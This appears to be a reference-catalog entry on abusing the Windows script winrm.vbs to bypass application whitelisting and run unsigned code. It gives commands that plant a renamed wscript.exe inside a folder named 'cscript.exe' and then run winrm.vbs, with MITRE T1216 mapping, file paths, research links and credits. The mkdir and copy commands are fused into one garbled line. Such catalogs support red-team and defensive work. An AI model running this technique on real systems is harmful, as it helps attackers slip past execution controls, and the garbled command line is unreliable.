## Winrm.vbs
```

winrm quickconfig
Execute winrm - requires registry changes to activate COM object

mkdir %SystemDrive%\BypassDir\cscript.exe copy %windir%\System32\wscript.exe %SystemDrive%\BypassDir\cscript.exe\winword.exe %SystemDrive%\BypassDir\cscript.exe\winword.exe //nologo %windir%\System32\winrm.vbs get wmicimv2/Win32_Process?Handle=4 -format:pretty
Creates Cscript.exe as dir to bypass winrm validation that cscript is running. Requires that a xls file is planted.
```
* Windows binary: True   
* Bypasses Default AppLocker Rules: False   
* Mitre: [T1216](https://attack.mitre.org/wiki/Technique/T1216)   
   
* Links:   
  * https://posts.specterops.io/application-whitelisting-bypass-and-arbitrary-unsigned-code-execution-technique-in-winrm-vbs-c8c24fb40404
  * https://www.youtube.com/watch?v=3gz1QmiMhss
  * https://www.slideshare.net/enigma0x3/windows-operating-system-archaeology
   
* File path:   
  * C:\Windows\System32\winrm.vbs
  * C:\Windows\SysWOW64\winrm.vbs
   
* Acknowledgement:   
  * Name: Matt Graeber
    * Twitter: [@mattifestation](https://twitter.com/@mattifestation)
    * Blog: http://www.exploit-monday.com/
  * Name: Matt Nelson
    * Twitter: [@enigma0x3](https://twitter.com/@enigma0x3)
    * Blog: https://enigma0x3.net
  * Name: Casey Smith
    * Twitter: [@subtee](https://twitter.com/@subtee)
    * Blog: http://subt0x11.blogspot.com/
   
OS:  
